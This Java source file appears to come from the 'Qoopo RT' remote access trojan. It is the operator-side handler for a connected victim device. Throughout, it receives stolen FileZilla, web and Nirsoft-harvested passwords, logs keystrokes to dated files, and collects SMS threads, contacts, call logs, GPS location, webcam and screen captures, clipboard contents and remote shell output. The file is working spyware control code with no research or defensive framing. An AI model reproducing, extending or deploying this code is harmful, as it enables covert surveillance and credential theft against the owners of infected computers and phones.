/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package qooport.asociado.v1;

import comunes.Archivo;
import comunes.CampoIcono;
import comunes.CapturaOpciones;
import comunes.Contacto;
import comunes.GPSPosicion;
import comunes.Llamada;
import comunes.Proceso;
import comunes.Sms;
import comunes.SmsConversacion;
import comunes.WebCamItem;
import java.awt.Color;
import java.awt.Dimension;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.List;
import javax.swing.ImageIcon;
import network.Conexion;
import qooport.asociado.Asociado;
import qooport.avanzado.QoopoRT;
import qooport.modulos.escritorioremoto.EscritorioRemoto;
import qooport.utilidades.Compresor;
import qooport.utilidades.GuiUtil;
import qooport.utilidades.Protocolo;
import qooport.utilidades.SizeUtil;
import qooport.utilidades.Util;
import qooport.utilidades.cifrado.Encriptacion;

/**
 *
 * @author alberto
 */
public class AsociadoV1 extends Asociado {

    public AsociadoV1(Conexion conexion, int tipoconexion, boolean ssl) {
        super(conexion, tipoconexion, ssl);
    }

    public AsociadoV1(Conexion conexion, int tipoconexion, boolean ssl, String host, int puerto) {
        super(conexion, tipoconexion, ssl, host, puerto);
    }

    private void enviarComando(int i) {
        try {
            conexion.escribirInt(i);
            conexion.flush();
            this.agregarEnviados(SizeUtil.sizeof(i));
        } catch (Exception ex) {
        }
    }

    private void enviarTexto(String cmd) {
        try {
            if (antiguo) {
                this.enviarObjeto(Encriptacion.cifra(cmd));
            } else {
                this.enviarObjeto(Util.texto(cmd));
            }
        } catch (Exception ex) {
        }
    }

    @Override
    public synchronized void enviarComando(int i, Object... cmd) {
        try {
            this.enviarComando(i);
            if (cmd != null) {
                for (Object t : cmd) {
                    if (t instanceof String) {
                        this.enviarTexto((String) t);
                    } else {
                        this.enviarObjeto(t);
                    }
                }
            }
        } catch (Exception ex) {
        }
    }

    //@Override
    private void enviarObjeto(Object objeto) {
        try {
            conexion.escribirObjeto(objeto);
            conexion.flush();
            this.agregarEnviados(SizeUtil.sizeof(objeto));
        } catch (Exception ex) {
        }
    }

    @Override
    public void run() {
        try {
            int comando = -1;
            String parametro = null;
            int anchoP = 0;
            int altoP = 0;
            byte[] data = null;
            while (activo) {
                parametro = null;
                comando = conexion.leerInt();
                //System.out.println("llego comando " + comando);
                this.agregarRecibidos(SizeUtil.sizeof(comando));
                switch (comando) {//
//                    case Protocolo.COMANDO_OBJETO:
//                        try {
//                            Comando comand = (Comando) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
//
//                        } catch (Exception e) {
//                        }
//                        break;

                    case Protocolo.GET_CURSOR:
                        try {
                            ImageIcon cursor = (ImageIcon) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                            getEscritorioRemoto().cambiarCursorRemoto(cursor);
                        } catch (Exception e) {
                        }
                        break;
                    case Protocolo.AUTENTICAR:
                        autenticar();
                        break;
                    case Protocolo.PUERTO_TRANSFERENCIA:
                        try {
                            parametro = leerCadena((byte[]) conexion.leerObjeto());
                            this.agregarRecibidos(SizeUtil.sizeof(parametro));
                            puertoTransferencia = Integer.valueOf(parametro);
                        } catch (Exception e) {
                        }
                        break;
                    case Protocolo.INFO:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        try {
                            datos = parametro.split(":");
                            identificador = datos[1];
                            datos[2] = conexion.getInetAddress().getHostAddress();
                            ip = datos[2];
                            try {
                                String[] m = datos[0].split("#");
                                pais = m[0];
                                bandera = m[1];
                            } catch (Exception e) {
                                pais = datos[0];
                                bandera = "3";
                            }
                            usuario = datos[4];
                            host = datos[5];
                            so = datos[7];
                            webCam = datos[6];
                            setAndroid(so.toLowerCase().contains("android"));
                            try {
                                QoopoRT.instancia.actualizarDatosServidor(this);
                            } catch (Exception e) {
                            }
                            if (abrirEscritoriRemotoAlconectar) {
                                abrirEscritorioRemoto();
                            }
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        infoRecibida = true;
                        enviarComando(Protocolo.GET_USUARIO_IMAGEN);
                        break;
                    case Protocolo.GET_INFO_COMPLETA:
                        parametro = (String) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (getInformacionGUI() != null) {
                            getInformacionGUI().txtInfo.setText(parametro);
                            getInformacionGUI().repaint();
                        }
                        break;
                    case Protocolo.GET_PORTAPAPELES:
                        parametro = (String) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (portapapeles != null) {
                            portapapeles.contenido.setText(parametro);
                            portapapeles.contenido2.setText(parametro);
                            portapapeles.repaint();
                        }
                        break;
                    case Protocolo.COMANDO_SHELL:
                        parametro = (String) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (consola != null) {
                            consola.salida.append(parametro);
                            consola.salida.setCaretPosition(consola.salida.getDocument().getLength());
                            consola.repaint();
                        }
                        break;
                    case Protocolo.CHAT_MENSAJE:
                        parametro = (String) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (this.chat != null) {
                            chat.salida.setCaretColor(Color.GREEN);
                            chat.salida.append(parametro + "\n");
                            chat.salida.setCaretPosition(chat.salida.getDocument().getLength());
                            chat.salida.setCaretColor(Color.BLUE);
                            chat.repaint();
                        }
                        break;
                    case Protocolo.GET_MINIATURA_PANTALLA:
                        recibirMiniatura(Compresor.descomprimirGZIP((byte[]) conexion.leerObjeto()));
                        break;
                    case Protocolo.GET_MINIATURA_CAM:
                        recibirMiniaturaWC((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_USUARIO_IMAGEN:
                        recibirImagenUsuario(Compresor.descomprimirGZIP((byte[]) conexion.leerObjeto()));
                        break;
                    case Protocolo.NO_WEB_CAM:
                        recibirNoWebCam();
                        break;
                    case Protocolo.ADMIN_ARCHIVOS_LISTAR_ROOTS:
                        recibirUnidades((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.LISTAR_WEBCAMS:
                        recibirListaWebCams((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_DIMENSIONES_CAM:
                        recibirListaWebCamsSizes((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_MONITORES:
                        recibirListaMonitores((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_RESOLUCION:
                        recibirListaResoluciones((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_RESOLUCION:
                        anchoP = conexion.leerInt();
                        altoP = conexion.leerInt();
//                            this.getEscritorioRemoto().getContenedorPrincipal().getPantalla(0).setSize(new Dimension(anchoP, altoP));
//                            this.getEscritorioRemoto().getContenedorPrincipal().getPantalla(0).setPreferredSize(new Dimension(anchoP, altoP));
                        if (!this.getEscritorioRemoto().isPantallaCompleta()) {
                            this.getEscritorioRemoto().getReproductor().getContenedor().setSize(new Dimension(anchoP, altoP));
                            this.getEscritorioRemoto().getReproductor().getContenedor().setPreferredSize(new Dimension(anchoP, altoP));
                            this.getEscritorioRemoto().repaint();
                            this.getEscritorioRemoto().pack();
                            GuiUtil.centrarVentana(getEscritorioRemoto(), anchoP, altoP);
                        }

                        break;
                    case Protocolo.GET_LISTA_PROCESOS:
                        recibirListaProcesos((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_CONEXIONES:
                        recibirListaConexiones((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_EQUIPOS_RED:
                        parametro = (String) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (this.redLan != null) {
                            if (!redLan.isVisible()) {
                                redLan.setVisible(true);
                            }
                            redLan.agregarFila(parametro);
                            redLan.repaint();
                        }
                        break;
                    case Protocolo.ADMIN_ARCHIVOS_LISTAR_DIRECTORIO:
                        recibirArchivos((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.BUSCAR_ARCHIVO:
                        recibirArchivosBusqueda((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.BUSCAR_ARCHIVO_DETENER:
                        if (this.adminArchivos != null) {
                            if (!adminArchivos.isVisible()) {
                                adminArchivos.setVisible(true);
                            }
                            adminArchivos.detenerBusqueda();
                            adminArchivos.repaint();
                        }
                        break;
                    case Protocolo.ADMIN_ARCHIVOS_THUMBAIL:
                        data = Compresor.descomprimirGZIP((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(data));
                        this.recibirThumbail(data);
                        break;
                    case Protocolo.PASSWORDS_FILEZILLA:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        if (passwords != null) {
                            passwords.passFZ.setText(parametro);
                            passwords.repaint();
                        }
                        break;
                    case Protocolo.PASSWORDS_DM:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        if (passwords != null) {
                            passwords.passDM.setText(parametro);
                            passwords.repaint();
                        }
                        break;
                    case Protocolo.PASSWORDS_WEB:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        if (passwords != null) {
                            passwords.passWB.setText(parametro);
                            passwords.repaint();
                        }
                        break;
                    case Protocolo.PASSWORDS_NIRSOFT:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        if (passwords != null) {
                            passwords.passNirsoft.setText(parametro);
                            passwords.repaint();
                        }
                        break;
                    case Protocolo.GET_LISTA_OFFLINE:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        if (this.archivosOffline != null) {
                            archivosOffline.txtListaOffline.setText(parametro);
                            archivosOffline.repaint();
                        }
                        break;
                    case Protocolo.MENSAJE_SERVIDOR:
                        parametro = leerCadena((byte[]) conexion.leerObjeto());
                        this.agregarRecibidos(SizeUtil.sizeof(parametro));
                        if (QoopoRT.instancia != null) {
                            QoopoRT.instancia.ponerEstado("Servidor (" + getInformacion() + "):" + parametro);
                        }
                        break;
                    case Protocolo.PING:// enviamos PING
                        enviarComando(Protocolo.PONG);
                        break;
                    case Protocolo.PONG:
                        pong = System.currentTimeMillis();
                        tiempoVida = pong - ping;
                        pings--;
                        if (QoopoRT.instancia != null) {
                            QoopoRT.instancia.actualizarDatosServidor(this);
                        }
                        break;
                    case Protocolo.UBICACION_GPS:
                        try {
                            GPSPosicion posicion = (GPSPosicion) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                            if (mapa != null) {
                                mapa.getMapa().updateMap(posicion.getLongitud(), posicion.getLatitud(), posicion.getAltitud(), posicion.getVelocidad(), posicion.getAcurrancy(), posicion.getTime(), posicion.getProveedor());
                                mapa.getMapa().repaint();
                                mapa.repaint();
                            }
                        } catch (Exception e) {
                        }
                        break;
                    case Protocolo.GET_LISTA_PROVEEDORES_GPS:
                        List<String> provedores = (List<String>) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (mapa != null) {
                            try {
                                mapa.getProvedor().removeAllItems();
                            } catch (Exception e) {
                            }
                            for (String provedorGPS : provedores) {
                                mapa.getProvedor().addItem(provedorGPS);
                            }
                            mapa.repaint();
                        }
                        break;
                    case Protocolo.GET_LISTA_CONTACTOS:
                        recibirContactos((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_SMS:
                        recibirSMS((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.GET_LISTA_LLAMADAS:
                        recibirLlamadas((byte[]) conexion.leerObjeto());
                        break;
                    case Protocolo.KEYLOGGER_GET_TEXT:
                        parametro = (String) Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                        if (this.keylogger != null) {
                            keylogger.contenido.append(parametro);
                            keylogger.repaint();
                        }
                        File f = new File(new File(new File(fKeylogger, sdfAnio.format(new Date())), sdfMes.format(new Date())), sdfDia.format(new Date()));
                        if (!f.exists()) {
                            f.mkdirs();
                        }
                        BufferedWriter out = null;
                        try {
                            out = new BufferedWriter(new FileWriter(new File(f, "keylogger.txt"), true));
                            out.write(parametro);
                        } finally {
                            if (out != null) {
                                out.close();
                            }
                        }
                        out = null;
                        break;
                    case Protocolo.KEYLOGGER_NO_PLUGIN:
                        if (keylogger != null) {
                            keylogger.contenido.append("\n<<<NO HAY PLUGIN>>>\n");
                            keylogger.repaint();
                        }
                        break;
                    case Protocolo.ENVIAR_PORTAPAPELES:
                        try {
                            //int tipo = conexion.leerInt();
                            conexion.leerInt();
                            Object objPortapaleles = Util.descomprimirObjeto((byte[]) conexion.leerObjeto(), this);
                            if (objPortapaleles != null) {
                                if (this.escritorioRemoto.getItmClipboard().isSelected()) {
                                    escritorioRemoto.getClipboard().setContent(objPortapaleles);
                                }
                            }
                        } catch (Exception e) {
                            //QoopoRT.instancia.ponerEstado("Error :" + this.getInformacion() + " al colocar portapapeles " + e.getLocalizedMessage());
                        }
                        break;

                }
            }
        } catch (Exception ex) {
            //ex.printStackTrace();
            desconectar();
        }
    }

    public void recibirUnidades(byte[] bytes) {
        if (adminArchivos != null) {
            if (!adminArchivos.isVisible()) {
                adminArchivos.setVisible(true);
            }
            try {
                adminArchivos.getUnidad().removeAllItems();
            } catch (Exception e) {
            }
            Archivo[] unidades = (Archivo[]) Util.descomprimirObjeto(bytes, this);
            if (unidades != null) {
                ImageIcon[] unitmp = new ImageIcon[unidades.length];
                for (int i = 0; i < unitmp.length; i++) {
                    if (unidades[i].getIcono() != null) {
                        ImageIcon item = new ImageIcon(unidades[i].getIcono());
                        item.setDescription(unidades[i].getPath());
                        unitmp[i] = item;
                    } else {
                        ImageIcon item = Util.cargarIcono16("/resources/folder.png");
                        item.setDescription(unidades[i].getPath());
                        unitmp[i] = item;
                    }
                }
                adminArchivos.setUnidades(unitmp);
                for (int i = 0; i < unitmp.length; i++) {
                    adminArchivos.getUnidad().addItem(i);
                }
            }
        }
    }

    public void recibirListaWebCams(byte[] bytes) {
        if (camara != null) {
            if (!camara.isVisible()) {
                camara.setVisible(true);
            }
            try {
                camara.getWebcam().removeAllItems();
            } catch (Exception e) {
            }
            WebCamItem[] lista = (WebCamItem[]) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                for (WebCamItem lista1 : lista) {
                    camara.getWebcam().addItem(lista1.getNombre());
                }
            }
            camara.actualizarMenuCamaras();
        }
    }

    public void recibirListaWebCamsSizes(byte[] bytes) {
        if (camara != null) {
            if (!camara.isVisible()) {
                camara.setVisible(true);
            }
            try {
                camara.getWebcamSizes().removeAllItems();
            } catch (Exception e) {
            }
            Dimension[] lista = (Dimension[]) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                String wcs = "";
                List<String> resol = new ArrayList<>();
                for (int i = 0; i < lista.length; i++) {
                    wcs = lista[i].width + "x" + lista[i].height;
                    if (!resol.contains(wcs)) {
                        camara.getWebcamSizes().addItem(wcs);
                        resol.add(wcs);
                    }
                }
            }
            try {
                camara.getWebcamSizes().setSelectedItem("800x600");//resolucion default
            } catch (Exception e) {
            }
            camara.actualizarMenuResolucion();
        }
    }

    public void recibirListaMonitores(byte[] bytes) {
        //EscritorioRemoto vent = (EscritorioRemoto) QoopoRT.capturasEscritorio.get(servidor.getIdentificador());

        if (escritorioRemoto != null) {
            if (!escritorioRemoto.isVisible()) {
                escritorioRemoto.setVisible(true);
            }
            try {
                escritorioRemoto.getCmbMonitor().removeAllItems();
//                vent.getMonitor().addItem("TODO -1 0x0");
            } catch (Exception e) {
            }
            String[] lista = (String[]) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                String[] dat;
                for (String arr : lista) {
                    dat = arr.split(":");
                    escritorioRemoto.getCmbMonitor().addItem("Monitor " + dat[0] + " " + dat[1] + "x" + dat[2]);
                }
            }
            escritorioRemoto.actualizarMenuMonitor();
        }
    }

    public void recibirListaResoluciones(byte[] bytes) {
        if (escritorioRemoto != null) {
            if (!escritorioRemoto.isVisible()) {
                escritorioRemoto.setVisible(true);
            }
            try {
                escritorioRemoto.getResolucion().removeAllItems();
            } catch (Exception e) {
            }
            List<String> lista = (ArrayList<String>) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                List<String> resoluciones = new ArrayList<>();
                for (String resol : lista) {
                    if (!resoluciones.contains(resol)) {
                        escritorioRemoto.getResolucion().addItem(resol);
                        resoluciones.add(resol);
                    }
                }
            }
            escritorioRemoto.actualizarMenuResolucion();
        }
    }

    public void recibirListaProcesos(byte[] bytes) {

        if (procesos != null) {
            if (!procesos.isVisible()) {
                procesos.setVisible(true);
            }
            List<Proceso> lista = (List<Proceso>) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                procesos.limpiatabla();
                for (Proceso p : lista) {
                    procesos.agregarFila(p.getDatos());
                }
            }
            procesos.repaint();
        }
    }

    public void recibirListaConexiones(byte[] bytes) {
        if (conexiones != null) {
            if (!conexiones.isVisible()) {
                conexiones.setVisible(true);
            }
            List<Proceso> lista = (List<Proceso>) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                conexiones.limpiatabla();
                for (Proceso p : lista) {
                    conexiones.agregarFila(p.getDatos());
                }
            }
            conexiones.repaint();
        }
    }

    public void recibirListaEquiposredLan(byte[] bytes) {
        if (redLan != null) {
            if (!redLan.isVisible()) {
                redLan.setVisible(true);
            }
            List<String> lista = (List<String>) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                redLan.limpiatabla();
                for (String p : lista) {
                    redLan.agregarFila(p);
                }
            }
            redLan.repaint();
        }
    }

    public void recibirArchivos(byte[] bytes) {
        if (adminArchivos != null) {
            if (!adminArchivos.isVisible()) {
                adminArchivos.setVisible(true);
            }
            Archivo[] archivo = (Archivo[]) Util.descomprimirObjeto(bytes, this);
//            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy/MM/dd HH:mm:ss");
            if (archivo != null) {
                adminArchivos.limpiaTablaRemota();
                adminArchivos.getModelotabla().addRow(new Object[]{
                    new CampoIcono(Util.obtenerBytes(Util.cargarIcono16("/resources/up_arrow.png")), "..")});
                for (Archivo p : archivo) {
                    adminArchivos.getModelotabla().addRow(new Object[]{
                        new CampoIcono(p.getIcono() != null ? p.getIcono() : (p.isCarpeta() ? Util.obtenerBytes(Util.cargarIcono16("/resources/folder.png")) : Util.obtenerBytes(Util.cargarIcono16("/resources/file.png"))), p.getNombre()),
                        //                                p.getNombre(),
                        p.isCarpeta() ? "(Carpeta)" : p.getTipo(),
                        p.getLength(),
                        sdf.format(new Date(p.getFecha()))
                    });
                }
                adminArchivos.getRutaRemota().setText(archivo[0].getPathParent().replace(adminArchivos.sep + "..", ""));
                if (archivo[0].getPathParent().contains(adminArchivos.sep + "..")) {
                    if (!adminArchivos.getRutaRemota().getText().contains(adminArchivos.sep)) {
                        adminArchivos.getRutaRemota().setText("");
                    } else {
                        adminArchivos.getRutaRemota().setText(adminArchivos.getRutaRemota().getText().substring(0, adminArchivos.getRutaRemota().getText().lastIndexOf(adminArchivos.sep)));
                    }
                }
            } else// si la lista viene vacia, agrego la flechita para ADMIN_ARCHIVOS_SUBIR de directorio, indicando que ya se recibio la repuesta del servidor
            {
                adminArchivos.limpiaTablaRemota();
                adminArchivos.getModelotabla().addRow(new Object[]{
                    new CampoIcono(Util.obtenerBytes(Util.cargarIcono16("/resources/up_arrow.png")), "..")});
            }
            adminArchivos.repaint();
        }
    }

    public void recibirArchivosBusqueda(byte[] bytes) {
        if (adminArchivos != null) {
            if (!adminArchivos.isVisible()) {
                adminArchivos.setVisible(true);
            }
            Archivo archivo = (Archivo) Util.descomprimirObjeto(bytes, this);
            if (archivo != null) {
                adminArchivos.getModelotablaResultados().addRow(new Object[]{
                    new CampoIcono(archivo.getIcono() != null ? archivo.getIcono() : (archivo.isCarpeta() ? Util.obtenerBytes(Util.cargarIcono16("/resources/folder.png")) : Util.obtenerBytes(Util.cargarIcono16("/resources/file.png"))), archivo.getNombre()),
                    //                            archivo.getNombre(),
                    archivo.isCarpeta() ? "(Carpeta)" : archivo.getTipo(),
                    archivo.getLength(),
                    archivo.getPathParent()
                });
            }
            adminArchivos.repaint();
        }
    }

    public void recibirContactos(byte[] bytes) {
        if (contactos != null) {
            if (!contactos.isVisible()) {
                contactos.setVisible(true);
            }
            ArrayList<Contacto> lista = (ArrayList<Contacto>) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                contactos.limpiatabla();
                for (Contacto p : lista) {
                    contactos.getModelotabla().addRow(
                            new Object[]{
                                p.getPhoto(),
                                p.getDisplay_name(),
                                p.getPhones() != null && !p.getPhones().isEmpty() ? p.getPhones().get(0) : "",
                                p.getEmails() != null && !p.getEmails().isEmpty() ? p.getEmails().get(0) : ""
                            });
                }
            }
            contactos.repaint();
        }
    }

    public void recibirSMS(byte[] bytes) {
        if (smsListar != null) {
            if (!smsListar.isVisible()) {
                smsListar.setVisible(true);
            }
            ArrayList<Sms> lista = (ArrayList<Sms>) Util.descomprimirObjeto(bytes, this);
            ArrayList<SmsConversacion> conversaciones = new ArrayList<>();
            if (lista != null) {
                smsListar.limpiatabla();
                for (Sms p : lista) {
                    boolean encontrado = false;
                    for (SmsConversacion c : conversaciones) {
                        if (c.getIdHilo() == p.getThid()) {
                            c.agregarSms(p);
                            encontrado = true;
                        }
                    }
                    if (!encontrado) {
                        SmsConversacion nueva = new SmsConversacion(p.getThid());
                        nueva.agregarSms(p);
                        conversaciones.add(nueva);
                    }
                }
                Collections.sort(conversaciones, new Comparator() {
                    @Override
                    public int compare(Object p1, Object p2) {
                        return new Date(((SmsConversacion) p1).getUltimo().getDate()).compareTo(
                                new Date(((SmsConversacion) p2).getUltimo().getDate())
                        );
                    }
                });
                for (SmsConversacion c : conversaciones) {
                    smsListar.getModelohilos().addRow(new Object[]{
                        c.getIdHilo(),
                        c.getUltimo().getAdd(),
                        c.getUltimo().getBody()});
                }
                smsListar.setHilos(conversaciones);
            }
            smsListar.repaint();
        }
    }

    public void recibirLlamadas(byte[] bytes) {
        if (smsListar != null) {
            if (!smsListar.isVisible()) {
                smsListar.setVisible(true);
            }
            ArrayList<Llamada> lista = (ArrayList<Llamada>) Util.descomprimirObjeto(bytes, this);
            if (lista != null) {
                smsListar.limpiatabla();
                SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                for (Llamada p : lista) {
                    smsListar.getModelotabla().addRow(
                            new Object[]{
                                p.getId(),
                                p.getType(),
                                sdf.format(new Date(p.getDate())),
                                p.getDuration(),
                                p.getNumber(),
                                p.getName(),
                                p.getRaw_contact_id()
                            });
                }
            }
            smsListar.repaint();
        }
    }

    public void enviarEscritorioRemotoOpciones(CapturaOpciones opciones) {

        boolean criterio = false;
        EscritorioRemoto er = this.getEscritorioRemoto();
        if (er == null) {
            criterio = true;
        } else if (er.getServicio().isPidiendo()) {
            criterio = true;
        }

        if (isConexionInversa() || criterio) {
            this.enviarComando(Protocolo.ESCRITORIO_REMOTO, opciones);
        } else {
            System.out.println("voy a iniciar conexion ");
            try {
                Conexion conexNueva = new Conexion(this.getHost(), this.getPuertoTransferencia(), this.getConexion().getTipo());
                System.out.println("conexion realizada voy a enviar comando");
                conexNueva.escribirInt(Protocolo.ESCRITORIO_REMOTO);
                conexNueva.flush();
                conexNueva.escribirObjeto(opciones);
                conexNueva.flush();
                if (er == null) {
                    er = new EscritorioRemoto(conexNueva, this);
                    er.setVisible(true);
                    er.setLocation(100, 100);
                    er.setTitle("Escritorio Remoto [" + getInformacion() + "]");
                    er.setConexion(conexNueva);
                    this.setEscritorioRemoto(er);
                } else {
                    if (!er.isVisible()) {
                        er.setVisible(true);
                    }
                    er.setConexion(conexNueva);
                    er.setTitle("Escritorio Remoto  [" + getInformacion() + "]");
                }
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
